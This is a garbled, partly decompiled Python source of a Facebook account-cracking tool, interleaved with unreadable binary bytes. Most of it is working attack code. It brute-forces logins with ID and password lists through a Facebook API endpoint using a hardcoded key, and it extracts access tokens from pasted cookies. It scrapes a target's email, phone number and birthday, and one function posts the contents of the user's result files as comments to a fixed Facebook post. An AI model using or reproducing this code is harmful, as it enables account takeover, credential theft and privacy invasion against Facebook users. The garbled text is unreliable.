f �}t�|j�}|d& �d'd(�}td)tt tt |||t!tf	 � d*|||f }	t�|	� td+t d d ��d!|	 � W  �q�W n& t"tf�y>   d,}Y n   Y n0 td-tt tt ||f � d||f }	t�|	� td+t d d ��d!|	 �  �q�qqtd.7 ad S )/Nr�   z[%s%s%s] %s/%s OK:%s CP:%s �	ua_me.txtr,   r   r,  g    �sAg    8�|Ai N  i@�  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPAr/  ZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typer?  r>  zx-fb-http-engine�,https://b-api.facebook.com/method/auth.login�/350685531728%7C62f8ce9f74b12f84c123cc23437a4a32�JSONr�   �en_US�iosr�   � 3f555f99fb61fcd7aa0c44f58f522ef6�	�access_token�formatZsdk_versionrN  Zlocaler  ZsdkZgenerate_session_cookiesZsig)�paramsrE  rZ  ZEAAAz)%s[%sOK%s]%s %s|%s|%s                 %s�%s|%srN  �.txtr�   r  �www.facebook.com�	error_msgr�   z-https://graph.facebook.com/%s?access_token=%sr!  r�   �-z %s[%sCP%s]%s %s|%s|%s%s      %sz%s|%s|%srP  r@   z%%s[%sCP%s]%s %s|%s                  r
   )#r  r   r�  r"   r#   r$   r�   r�   �looprQ   r�   rH  r.  r%   r.   r/   r0   rr  rs  r   ZrandintrI   rJ   rL   rS   �Hr�   r�   r�  r�   r�   r�   r�   r  rY   )r>  r}  rJ  r�  Z
useragenthZheaders_rF  r\  �responser  Zloginzr�   ZakZazZdobr   r   r   rF  Q  sX    
.
:


zcrackmenu.apic              	   C   sV  t dd���}| jD �]�}�z�|�d�}|d �d�}t|�dkr�|d |d d |d d	 |d d
 |d d |d  d |d  d |d  d |d  g}�nLt|�dkr�|d |d d |d d	 |d d
 |d d |d  g}�nt|�dk�r8|d |d d |d d	 |d d
 |d d |d  g}n�t|�dk�r�|d |d d |d d	 |d d
 |d d |d  d |d  g}nbt|�dk�r�|d |d d |d d	 |d d
 |d d |d  d |d  d |d  g}n |�| j|d |� W q   Y q0 qW d   � n1 �s,0    Y  t�| j� t	dt
 d � d S )N�   r�   r�   r
   r@   r�   r   r  r  r  r�   rC   r�  r	  zCrack Done...)rE  r�   r�   rQ   r�   rF  r   r�  rG  rU   rO   )r>  rG  �unamer�   ZxzZpwsr   r   r   r  �  s(    
b><HT(zcrackmenu.passwordsN)�__name__�
__module__�__qualname__r@  r  rF  r  r   r   r   r   r  #  s   *:r  c                   @   s$   e Zd Zdd� Zdd� Zdd� ZdS )r  c              
   C   s  g | _ g | _d| _tdt d t d t d t d t d t d t d	 t d
 �}|dkrfqq|dksx|dk�r�z�z"|| _t| j��	� �
� | _W q�W qz ty� } z*ttd � t�  W Y d }~qzW Y d }~qzd }~0 0 qzg | _| jD ]4}z| j�d|�d�d i� W q�   Y q�Y q�0 q�W n> t�yd } z$ttd � W Y d }~qW Y d }~n
d }~0 0 ttd � | ��  �qq|dk�s�|dkrz�z$|| _t| j��	� �
� | _W �qW nF t�y� } z,ttd � t�  W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �qY n0 �qW nD t�y� } z*ttd � t�  W Y d }~qW Y d }~n
d }~0 0 tdt d t d t d � ttd t d t d � td��| j| j� t�| j� ttd � �qqd S ) Nr   r!   r   r   r   �& Do You Want To Use Manual Password?? �[ �Y/n� ]z : r?   rA  rD  zProblem Not Found !!r�   r�   zProblem Not Foundz Password Example : sayang,anjingrB  rM  r
   �r�   r�  zFile Tidak Valid�Ok Crack Results Saved At : rN  r^  �Cp Crack Results Saved At : rP  rO  r=   zDone ...)�adar.  �korN   r�   r�   �hrG  r.   r/   r�   �fsr�   rS   rO   r�   �flr�   r�   r�   �pwlistr!  r�   r�  �
ThreadPool�mapr  r   r�  �r>  r?  r�  r)   rP   r   r   r   r@  �  sf    H$
"
(
." zgrap.__init__c                 C   s�   t td ��d�| _t| j�dkr,| ��  n�| jD ]}|�d| ji� q2tdt	 d t
 d t d � tt	d	 t
 d
 t d � td��| j| j� t�| j� td� d S )NzPassword : rK  r   r�  r!   ro  rN  r^  rp  rP  rO  r�  z
Done..)rN   r�   r�   r�  rQ   rv  ru  ru  rS   rO   r�   r�  rw  rx  r  r   r�  rG  �r>  rP   r   r   r   rv  �  s    

 zgrap.pwlistc                 C   s�  �z�|� d�D �]h}t|� d�|d�}|� d�dkr�ttd t d t d t |� d�d	 | d
  � | j�d|� d�|f � |� d�tdt d ��	� v r� �qzn&tdt d d��
d|� d�|f � d|� d�|f } �qzq|� d�dkrttd t d t d t |� d�d | d
  � | j�d|� d�|f � tdt d d��
d|� d�|f �  �qzqqq|  jd7  _td| jt| j�t| j�t| j�f dd� tj��  W n   | �|� Y n0 d S )Nr�  r�   zhttps://graph.facebook.comr-  r+  z[r�  r   z[0;97m|[0;92mz      r]  rN  r^  r�   z%s|%s

r.  r�  z[0;97m|[0;93m rP  �%s|%s
r
   zo[0;33m[[0;37mCrack[0;33m][0;37m %s/%s [0;32m([0;37mOK : %s[0;32m) [0;33m([0;37mCP : %s[0;33m)[0;37mr@   r�   )rJ   r;  rS   r�   r�   rq  r�   r.   r�  r/   r$   r�   r.  rr  rQ   ru  r"   r#   r%   r  )r>  ru  rP   �logrr  r   r   r   r  �  s6    
�6�6�:z	grap.mainN)rg  rh  ri  r@  rv  r  r   r   r   r   r  �  s   7r  c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
�bapittlc                 C   s&   d| _ g | _g | _d| _| �|� d S �NFr   ��setpwrH  r.  rb  r  r=  r   r   r   r@    s
    zbapittl.__init__c              
   C   s0  t �  tdt d t d t d t d t d t d t d t � ttd t d t d t d	 �}|d
v r�ttd t d t d t d � qJqJ|dv �r��z4z$|| _t| j��� �	� | _
W �q.W q� t�y* } z@ttd t d t d t d|  � W Y d }~q�W Y d }~q�d }~0 0 q�g | _ttd t d t d t d � ttd t d t d t d ��d�| _t| j�dk�r�W qJ| j
D ]<}z"| j�|�d�d | jd�� W n   Y �q�Y n0 �q�W n> t�y } z$td| � W Y d }~qJW Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�  �q,qJ|dv rJz�z$|| _t| j��� �	� | _
W �q"W n< t�y } z"t|� W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| j
D ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q.Y n0 �q.W n   Y qJY n0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j� t�  �q,qJd S )Nr!   r   r   r   rj  rk  rl  rm  z Dumai-991 : r>   r   � Invalid NumberrC  � %s�" Example : sayang,bismillah,123456� Password List : rK  r   r�   rn  �  %sr�  � Crack Started...�" Account [OK] Saved to : Hasil/OK-r^  �" Account [CP] Saved to : Hasil/CP-rO  r�  rL  r
   �r"  rS   r�   r�   rs  rN   rG  r.   r/   r�   rt  r�   ru  r�   r�  rQ   r�   r�  rw  rx  �bruterU   r!  r   r�  ry  r   r   r   r    sj    D$$

($$,
""t
(
.
tzbapittl.krahc           	   
   C   s�  ddd|d|dddd�	}d	}t j||d
�}t�d|j�r�| j�|d | � td||tf � t�|d | � t	dt
 d d�}|�t|�d t|� d � |��  dS d|�� d v �r~z<t �dt|� d t	dd���  �}t�|j�}|d aW n   Y n0 | j�|d | d t � td||tf � t	dt
 d d�}|�t|�d t|� d tt� d � |��  dS dS )NrT  rU  r�   rV  rW  r�   rX  rY  rS  �r\  �	(EAAA)\w+r_   �2[0;32m[[0;37mOK[0;32m] %s|%s %s               rN  r^  r  r!   Tr_  r`  r�   r   r�   r,   r!  z*[0;33m[[0;37mCP[0;33m] %s|%s|%s[0m   zCP-r�   F)rI   rJ   r^  �searchrL   rH  r�   rS   rM  r.   r�  r$   r   rT   r�   r/   r�   �ttlr.  )	r>  �usernamer  r\  rF  rd  �saveZkeZttr   r   r   �bruteRequestB  s0    $*zbapittl.bruteRequestc                 C   s4  | j dkr�|  jd7  _|d D ]z}|d �� }|�� }z| �||�dkrPW  q�W n   Y q Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q n�|  jd7  _| j D ]|}td �� }|�� }z| �||�dkr�W  �q0W n   Y q�Y n0 td| jt| j�t| j�t| j�f dd� t	j
��  q�d S )	NFr
   r�  r�   T�o[0;33m[[0;37mCrack[0;33m][0;37m %s/%s [0;32m[[0;37mOK : %s[0;32m] [0;33m[[0;37mCP : %s[0;33m][0;37mr@   r�   �r�  rb  r  r�  rS   rQ   ru  rH  r.  r"   r#   r%   �users�r>  ru  r�  r�  r  r   r   r   r�  ]  s*    


:

zbapittl.bruteN�rg  rh  ri  r@  r  r�  r�  r   r   r   r   r}    s   :r}  c                   @   s,   e Zd Zdd� Zdd� Zdd� Zdd� Zd	S )
r  c                 C   s&   d| _ g | _g | _d| _| �|� d S r~  r  r=  r   r   r   r@  u  s
    zbapi.__init__c              
   C   s0  t �  tdt d t d t d t d t d t d t d t � ttd t d t d t d	 �}|d
v r�ttd t d t d t d � qJqJ|dv �r��z4z$|| _t| j��� �	� | _
W �q.W q� t�y* } z@ttd t d t d t d|  � W Y d }~q�W Y d }~q�d }~0 0 q�g | _ttd t d t d t d � ttd t d t d t d ��d�| _t| j�dk�r�W qJ| j
D ]<}z"| j�|�d�d | jd�� W n   Y �q�Y n0 �q�W n> t�y } z$td| � W Y d }~qJW Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�  �q,qJ|dv rJz�z$|| _t| j��� �	� | _
W �q"W n< t�y } z"t|� W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| j
D ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q.Y n0 �q.W n   Y qJY n0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j� t�  �q,qJd S )Nr!   r   r   r   rj  rk  rl  rm  z Dumai-991 ?: r>   r   r�  rC  r�  r�  r�  rK  r   r�   rn  r�  r�  r�  r�  r^  r�  rO  r�  rL  r
   r�  ry  r   r   r   r  {  sj    D$$

($$,
""t
(
.
tz	bapi.krahc              
   C   s$  ddd|d|dddd�	}d	}t j||d
�}t�d|j�r�| j�|d | � td||tf � t�|d | � t	dt
 d d�}|�t|�d t|� d � |��  dS d|�� d v �r | j�|d | � td||tf � t	dt
 d d�}|�t|�d t|� d � |��  dS dS )NrT  rU  r�   rV  rW  r�   rX  rY  rS  r�  r�  r_   r�  rN  r^  r  r!   Tr_  r`  z2[0;33m[[0;37mCP[0;33m] %s|%s %s               rP  r�   F)rI   rJ   r^  r�  rL   rH  r�   rS   rM  r.   r�  r$   r   rT   r�   r.  )r>  r�  r  r\  rF  rd  r�  r   r   r   r�  �  s&    zbapi.bruteRequestc              	   C   s8  | j dkr�|  jd7  _|d D ]|}|d �� }|�� }z| �||�dkrPW  q�W n   Y q Y n0 td|| jt| j�t| j�t| j�f dd� t	j
��  q n�|  jd7  _| j D ]~}td �� }|�� }z| �||�dkr�W  �q4W n   Y q�Y n0 td|| jt| j�t| j�t| j�f dd� t	j
��  q�d S )	NFr
   r�  r�   Tzl[0;33m[[0;37m%s[0;33m][0;37m %s/%s [0;32m([0;37mOK : %s[0;32m) [0;33m([0;37mCP : %s[0;33m)[0;37mr@   r�   r�  r�  r   r   r   r�  �  s*    


<

z
bapi.bruteNr�  r   r   r   r   r  t  s   :r  c                   @   s4   e Zd Ze�d� e�  dd� Zdd� Zdd� ZdS )	r  r   c              
   C   sX  g | _ g | _d| _t�  tdt d t d t d t d t d t d t d	 t � ttd t d t d t d
 �}|dkr�q\q\|dv �r�z�z"|| _	t
| j	��� �� | _W q�W q� ty� } z$td| � W Y d }~q�W Y d }~q�d }~0 0 q�g | _| jD ]8}z| j�d|�d�d i� W n   Y �qY n0 �qW n> t�y� } z$td| � W Y d }~q\W Y d }~n
d }~0 0 ttd t d t d t d � | ��  �qTq\|dv r\z�z$|| _	t
| j	��� �� | _W �q(W n@ t�y" } z&td| � W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �q4Y n0 �q4W n2 t�y� } ztd| � W Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j	� t�  �qTq\d S )Nr   r!   r   r   r   rj  rk  rl  rm  r�  r?   )rD  rA  �   %sr�   r�   r�  )rM  rB  r
   rn  r�  r�  r�  r^  r�  rO  r=   �rq  r.  rr  r"  rS   r�   r�   rs  rN   rG  r.   r/   r�   rt  r�   ru  r�   r�   rv  r!  r�  rw  rx  r  r   r�  rU   ry  r   r   r   r@  �  s`    D$
$
"$
(
."tzcrackffb.__init__c                 C   s�   t td t d t d t d ��d�| _t| j�dkrD| ��  n�| jD ]}|�d| ji� qJt	td t d t d t d	 t d t d t d t d
 t
 d t d t d t d t d t
 d � td��| j| j� t�| j� t�  d S �Nr   r   r   r�  rK  r   r�  r�  r�  r�  r^  r�  rO  r�  �rN   r�   r�   r�   r�  rQ   rv  ru  ru  rS   r�  rw  rx  r  r   r�  rG  rU   rz  r   r   r   rv  	  s    ,

tzcrackffb.pwlistc                 C   s^  �z@|� d�D ]�}t|� d�|d�}|� d�dkr�td|� d�|f � | j�d|� d�|f � tdt d	 d
��d|� d�|f �  q�q|� d�dkrtd|� d�|f � | j�d|� d�|f � tdt d	 d
��d|� d�|f �  q�qqq|  j	d7  _	td| j	t
| j�t
| j�t
| j�f dd� tj��  W n   | �|� Y n0 d S )Nr�  r�   zhttps://free.facebook.comr-  r.  �/[0;33m[[0;37mCP[0;33m] %s|%s               r]  rP  r^  r�   r{  r+  �/[0;32m[[0;37mOK[0;32m] %s|%s               zOK-r
   r�  r@   r�   )rJ   Zf_fbrS   r.  r�   r.   r�  r$   rq  rr  rQ   ru  r"   r#   r%   r  �r>  ru  rP   r|  r   r   r   r  $	  s0    
���:zcrackffb.mainN�	rg  rh  ri  r   r   r   r@  rv  r  r   r   r   r   r  �  s
   
4r  c                   @   s4   e Zd Ze�d� e�  dd� Zdd� Zdd� ZdS )	r  r   c              
   C   sn  g | _ g | _d| _t�  tdt d t d t d t d t d t d t d	 t � ttd t d t d t d
 �}|dkr�q\q\|dks�|dk�r�z�z$|| _	t
| j	��� �� | _W �qW q� t�y } z$td| � W Y d }~q�W Y d }~q�d }~0 0 q�g | _| jD ]8}z| j�d|�d�d i� W n   Y �qY n0 �qW n> t�y� } z$td| � W Y d }~q\W Y d }~n
d }~0 0 ttd t d t d t d � | ��  �qjq\|dk�s�|dkr\z�z$|| _	t
| j	��� �� | _W �q>W n@ t�y8 } z&td| � W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �qJY n0 �qJW n2 t�y� } ztd| � W Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j	� t�  �qjq\d S �Nr   r!   r   r   r   rj  rk  rl  rm  r�  r?   rD  rA  r�  r�   r�   r�  rM  rB  r
   rn  r�  r�  r�  r^  r�  rO  r=   r�  ry  r   r   r   r@  >	  s`    D$
$
"$
(
."tzcrack2.__init__c                 C   s�   t td t d t d t d ��d�| _t| j�dkrD| ��  n�| jD ]}|�d| ji� qJt	td t d t d t d	 t d t d t d t d
 t
 d t d t d t d t d t
 d � td��| j| j� t�| j� t�  d S r�  r�  rz  r   r   r   rv  r	  s    ,

tzcrack2.pwlistc                 C   s^  �z@|� d�D ]�}t|� d�|d�}|� d�dkr�td|� d�|f � | j�d|� d�|f � tdt d	 d
��d|� d�|f �  q�q|� d�dkrtd|� d�|f � | j�d|� d�|f � tdt d d
��d|� d�|f �  q�qqq|  j	d7  _	td| j	t
| j�t
| j�t
| j�f dd� tj��  W n   | �|� Y n0 d S )Nr�  r�   r   r-  r.  r�  r]  rP  r^  r�   r{  r+  r�  rN  �.txt.txtr
   r�  r@   r�   )rJ   r<  rS   r.  r�   r.   r�  r$   rq  rr  rQ   ru  r"   r#   r%   r  r�  r   r   r   r  }	  s0    
���:zcrack2.mainNr�  r   r   r   r   r  ;	  s
   
4r  c                   @   s4   e Zd Ze�d� e�  dd� Zdd� Zdd� ZdS )	r  r   c              
   C   sn  g | _ g | _d| _t�  tdt d t d t d t d t d t d t d	 t � ttd t d t d t d
 �}|dkr�q\q\|dks�|dk�r�z�z$|| _	t
| j	��� �� | _W �qW q� t�y } z$td| � W Y d }~q�W Y d }~q�d }~0 0 q�g | _| jD ]8}z| j�d|�d�d i� W n   Y �qY n0 �qW n> t�y� } z$td| � W Y d }~q\W Y d }~n
d }~0 0 ttd t d t d t d � | ��  �qjq\|dk�s�|dkr\z�z$|| _	t
| j	��� �� | _W �q>W n@ t�y8 } z&td| � W Y d }~�q�W Y d }~n
d }~0 0 �q�g | _| jD ]H}z.| j�|�d�d t|�d�d �d�� W n   Y �qJY n0 �qJW n2 t�y� } ztd| � W Y d }~n
d }~0 0 ttd t d t d t d t d t d t d t d t d t d t d t d t d t d � td��| j| j� t�| j	� t�  �qjq\d S r�  r�  ry  r   r   r   r@  �	  s`    D$
$
"$
(
."tzcrack.__init__c                 C   s�   t td t d t d t d ��d�| _t| j�dkrD| ��  n�| jD ]}|�d| ji� qJt	td t d t d t d	 t d t d t d t d
 t
 d t d t d t d t d t
 d � td��| j| j� t�| j� t�  d S r�  r�  rz  r   r   r   rv  �	  s    ,

tzcrack.pwlistc                 C   s>  �z |� d�D �] }t|� d�|d�}|� d�dkr�td|� d�|f � | j�d|� d�|f � tdt d	 d
��d|� d�|f � t|� d�|�  �qq|� d�dkrtd|� d�|f � | j	�d|� d�|f � tdt d d
��d|� d�|f �  �qqqq|  j
d7  _
W n   | �|� Y n0 d S )Nr�  r�   r   r-  r.  r�  r]  rP  r^  r�   r{  r+  r�  rN  r�  r
   )rJ   r8  rS   r.  r�   r.   r�  r$   r&  rq  rr  r  r�  r   r   r   r  �	  s0    
���z
crack.mainNr�  r   r   r   r   r  �	  s
   
4r  c                  C   sB  t �d� t�  ttd t d t d t d � ttd t d t d t d � ttd t d	 t d t d
 � ttd t d t d t d �} | dkr�ttd t d t d t d � t�  nj| dkr�t�  t	�  nT| dk�rt�  t
�  n<| d	k�rt�  n*ttd t d t d t d � t�  d S )Nr   r�  r�   r   z Login Tokenr   r�   z Login Cookiesr  z Exitr   r�  r?   r   r�  )r   r   r   rS   r�   r�   rN   r�   �Get_Ua�	log_token�genrU   )Zsekr   r   r   r�   �	  s&    
$$$$$

$r�   c                  C   s  t �d� t�  ttd � ttd � ttd t d t d t d �} zlt�	d|  �}t
�|j�}|d	 }td
d�}|�| � |��  ttd t d t d t d � t�  W nF ty�   ttd t d t d t d � t �d� t�  Y n0 d S )Nr   zJYou Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile�0LINK FACEBOOK : HTTPS://M.FACEBOOK.COM/llovexnxxr�  r   r   z	 Token : z+https://graph.facebook.com/me?access_token=r�   r�   rF   � Login Successfulr   r   � Token Invalid)r   r   r   rS   rO   rN   r�   r�   rI   rJ   r�   r�   rL   r.   r$   rT   �
bot_followrY   r�   )r6   r�  r  r�  Zzeddr   r   r   r�  
  s$    
$

$
$
r�  c                  C   sn  t �d� t�  td� td� ttd t d t d t d �} zTtjdd	d
dddddddd�	d| id�}t	�
d|j�}|d u r�dnd|�d� }W n� tjjy�   ttd t d t d t d � Y nL ttg�y   ttd t d t d t d � t �d� t�  Y n0 tdd�} | �|�d�� | ��  ttd t d t d t d � t�  d S ) Nr   zMYou Don't Have Facebook Cookies/Tokens :( Please Visit My Facebook Profile...r�  r�  r   r   z
 Cookies: zGhttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_z�Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36zhttps://m.facebook.com/r9  r   r�   r8  r.  r#  ztext/html; charset=utf-8)	r?  rA  Zhostr=  r<  rC  r;  r@  r>  rZ  )rE  r\  z	(EAAA\w+)z&
* Fail : maybe your cookie invalid !!z
* Your fb access token : r
   r   r   z No Connectionz Cookies Invalidr�   rF   r�  )r   r   r   rS   rN   r�   r�   rI   rJ   r^  r�  rL   �grouprV   rW   rY   r0   r�   r.   r$   rT   r�  )rZ  r�   Z
find_tokenZhasilr   r   r   r�  
  sB    
$���($

$r�  c                 C   s8   t �| �}|D ]$}| d | }ttd t | � qd S )Nr�   r�  )r   r�   rS   rO   r�   )Zfolderr  r�   r�   r   r   r   r�  ?
  s    
r�  c                  C   s�   z�t �d�j�� } | �d�\}}|�d�}t �d�j�� }|�d�\}}|�d�}tdt d t d t d � t	dt d	 t
 |d
  � t	td t
 |d
  � W n6 t jjy�   t�d� t	td � t�d� Y n0 d S )Nz8https://komarev.com/ghpvc/?username=Dumai-991&color=bluez<text x="105" y="14">z</text>z�https://camo.githubusercontent.com/2d7842801a4429dade77642a7444a8d2d8bd83e92e9f9944aaeaa11343d250ae/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d44756d61692d39393126636f6c6f723d626c7565r!   z'Checking Visitor Tools And Github !! ( z"Check Tools Pengunjung Dan Github r�   zVisitors on Tools  : r   zVisitors on Github : r   r   r�  )rI   rJ   rL   rM   r�   r*   rO   r�   r�   rS   r�   rV   rW   r   r   r&   r'   )r'  ZmemekwZmemekqZgithubxZpepeqZpepepZpepekZtermuxr   r   r   r�  E
  s    

 
r�  c                 C   s8   t �| �}|D ]$}| d | }ttd t | � qd S )Nr�   r�   )r   r�   rS   r�   rP   )Ztempatr  r�   r  r   r   r   �	hide_fileU
  s    
r�  c                  C   s�   z t dd��� } t dd��� }W nF tyf   ttd t d t d t d � t�d� t�  Y n0 z^t	�
d�}|D ]J}d	| }t |��� �� }d
| d t d | }t�d| d | � qxW n   Y n0 d S )Nr�   r,   r�  r   r   r�  r
   r�   r�   zNama File : z
Tanggal Upload : r�   z>https://graph.facebook.com/4295900450517391/comments/?message=r�  )r.   r/   r0   rS   r�   r�   r&   r'   r�   r   r�   r�   r�   rI   rI  )r6   r�   r  r�   r  Z	open_fileZkata_allr   r   r   �curiakunZ
  s    $

r�  c           
   
   C   s�  d}zt dd��� }W nF ty\   ttd t d t d t d � t�d� t�  Y n0 z&t	�
d	|  d
 | �}t�|j�}W n\ ty� } zttd � t�  W Y d }~n0d }~0  ttfy�   ttd � t�  Y n0 z|d }W n ttf�y
   d}Y n0 z|d }W n ttf�y4   d}Y n0 ttd | | � t�d� ttd | |  � t�d� ttd | | � t�d� ttd | | � t�d� t dd�}	|	�| d | d | d � |	��  d S )Nr   r�   r,   r�  r   r   r�  r�  r�   r   �Masalah Tidak DiTemukanr�   r@   r!  zName Facebook : r  zID Facebook   : zPassword      : zTanggal Lahir : zget_ttl.txtz+ar_   r!   )r.   r/   r0   rS   r�   r�   r   r   r�   rI   rJ   r�   r�   rL   r�   rO   rU   rY   r&   r'   r$   rT   )
r�   r  rP   r6   r)  r*  r)   r�  r+  Zgxr   r   r   �get_ttlj
  s>    $



r�  c            "   
   C   s6  d} zt dd��� }W nF ty\   ttd t d t d t d � t�d� t�  Y n0 z6t	t
d	 t �}t�d
| d | �}t�|j�}W n\ ty� } zttd � t�  W Y d }~n0d }~0  ttfy�   ttd � t�  Y n0 z|d }W n$ ttf�y"   td t }Y n0 z|d }W n$ ttf�yT   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 z|d }	W n$ ttf�y�   td t }	Y n0 z|d }
W n$ ttf�y�   td t }
Y n0 z|d }W n$ ttf�y   td t }Y n0 z|d }W n$ ttf�yN   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 zd|d d  }W n$ ttf�y�   td t }Y n0 z|d d }W n$ ttf�y�   td t }Y n0 z|d d }W n$ ttf�y&   td t }Y n0 z|d }W n$ ttf�yX   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 z|d }W n$ ttf�y�   td t }Y n0 z|d }W n$ ttf�y    td t }Y n0 z|d }W n$ ttf�yR   td t }Y n0 z�t�d
| d  | �}g }t�|j�}|d d! �d"d#�}t |d$�}|d% D ]>} |�| d d& | d  � |�| d d& | d  d' � �q�|��  d(t|� }W n  t�y   td t }Y n0 z�t�d)||f �}t�|j�}t |d$�}|d% D ]L}|d }|d }|�d"�d* } |�|d& |  � |�|d& |  d' � �qL|��  W n   Y n0 z.t�d+||f �}t�|j�}|d, d- }!W n. ttf�y   d.ttf }!Y n   Y n0 td't d/ � t�d0� td't d1| |f  � ttd2| |f  � ttd3| |f  � t�d0� ttd4| |
f  � t�d0� ttd5| |f  � t�d0� td't d6 � t�d0� td't d7| |f  � t�d0� ttd8| |f  � t�d0� ttd9| |f  � t�d0� ttd:|  � t�d;� ttd<|!  � t�d0� ttd=||f  � t�d;� ttd>| |f  � t�d0� ttd?| |f  � t�d0� ttd@| |f  � t�d0� ttdA| |f  � t�d0� ttdB| |f  � t�d0� t d't dC � t	tdD � t!�  d S )ENr   r�   r,   r�  r   r   r�  r�  zMasukkan ID Target :r�   r   r�  r�   u   —Z
first_nameZ	last_namer�   r�  r!  �timezoneZrelationship_statusz	dengan %sZsignificant_other�locationZhometownZlinkZupdated_timeZmobile_phonerN  ZaboutZgenderr�   r�  r@   r�   rF   r�   r�   r!   ra   r�  r   r  r  r  z%s-%szInformasih Targwt !!g333333�?zFull Name       : %s%szFirst Name      : %s%szLast Name       : %s%szUserName        : %s%szTanggal Lahir   : %s%szData Data Target !!zGmail Facebook  : %s%szNomor Telepons  : %s%szJenis Kelamin   : %s%szJumlah Teman    : %sr  zFollowers       : %szStatus Hubungan : %s %szLink Facebook   : %s%szTentang Status  : %s%szKota Asal       : %s%szTinggal         : %s%szTerahir DiUpdate: %s%szAthour : Mr.RiskyzTekan Enter Untuk Kembali)"r.   r/   r0   rS   r�   r�   r   r   r�   rN   r�   rI   rJ   r�   r�   rL   r�   rO   rU   rY   r�   r%  r�   r�   r$   rT   rQ   r  rM  r&   r'   r�   r*   r�   )"rP   r6   r�   r)  r*  r)   r�  ZnamadeZnamabeZidfbr}  r+  ZtzimZstasZdgnZtiglZdariZlinsZuptdZnmrrZemaiZbiooZgndrr,   r�   r(   ZqqZysr  Zbmxr�   r�   r�   r  r   r   r   r�  �
  s   $

"
"r�  c                   C   s&  t �d� t�  ttd t d t d t � ttd t d t d t � zt �d� W n6 ty�   ttd t d t d	 t d
 � Y n0 ttd t d t d t � zt �d� W n6 ty�   ttd t d t d	 t d
 � Y n0 ttd t d t d t � t	�  d S )Nr   z
[ zResult Crack -- Hasil Crackrm  r�  zcat Hasil/OK*.txtr   r   r   z No Result Foundr�  zcat Hasil/CP*.txtZBack)
r   r   r   rS   r�   r�   rs  r0   rN   r�   r   r   r   r   r�    s    
  * * r�  c                   C   s
   t �  d S r   )r�  r   r   r   r   r�  '  s    r�  c                  C   s  zt dd��� } W �n� t�y   t�d� t�d� d}d}d}d}t�  tt� d	�� tt� d
�� tt	� d�� tt	� d�t
 � ttd t
 d t d t
 d t d t d � ttd t
 d t d t
 d t d t d � ttd t
 d t d t
 d t d t d � ttd t
 d t d t
 d t d t d � ttd t
 d t d t
 d � tt	d �}|dk�s�|dk�r�t�d� t dd �}|�|� |��  tt	d! � �n6|d"k�s�|dk�rt�d� t dd �}|�|� |��  tt	d! � n�|d#k�s0|dk�rdt�d� t dd �}|�|� |��  tt	d! � n�|d$k�sx|dk�r�t�d� t dd �}|�|� |��  tt	d! � n^|d%k�s�|dk�r�t�d� td&�}t dd �}|�|� |��  tt	d! � ntd'� t�  Y n0 d S )(NrR  r,   r�  r   z�Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36r   z�Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4z�Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]zUser Agent BrokenzCreated By Riskyz,Silahkan Pilih User Agent Untuk DiGunakan !!z"Please Select A User Agent To Use
r   r�   r   z Made by Risky r   z Anti Check Pointsr�   z Made by Dapunta z Check Point ? Dayr�   z Made by Angga z Check Point 7 Dayr�   z Made by Zee K World z Tap Yesr�   z Own Useragentz	Choose : r�   rF   zRun the Tools Again !!r�   r�   r�   r�   zLogin Your User Agent User : zFailed to Choose)r.   r/   r0   r   r   r    r*   r�   rS   rO   r�   r�   r�   r�   rN   r$   rT   rU   r�  )r6   Zua_risZua_zeeZua_angZua_dam�vr  Zxxr   r   r   r�  )  sj    

4444$














r�  c               
   C   s�   zjdd l } dd l } ddlm} ddlm} tj�d�dkrDt�d� tj�d�dkrbt	dd��
�  t�  W n8 ty� } z ttd t|� � W Y d }~n
d }~0 0 d S )	Nr   r�  )r�   r�   F�Hasil/cp.txtr�   zERROR : )rI   r�  r�  Zconcurrent.futuresr�   r   r2   r3   r�  r.   rT   �kentodxxr�   rU   rO   r   )rI   r�  r�   �Er   r   r   r�   a  s    

r�   c                  C   sN  t �d� tdd�} tdt� dt� dt� dt� dt� d	t� d
t� dt� dt� dt� dt� dt� dt	� d�� t
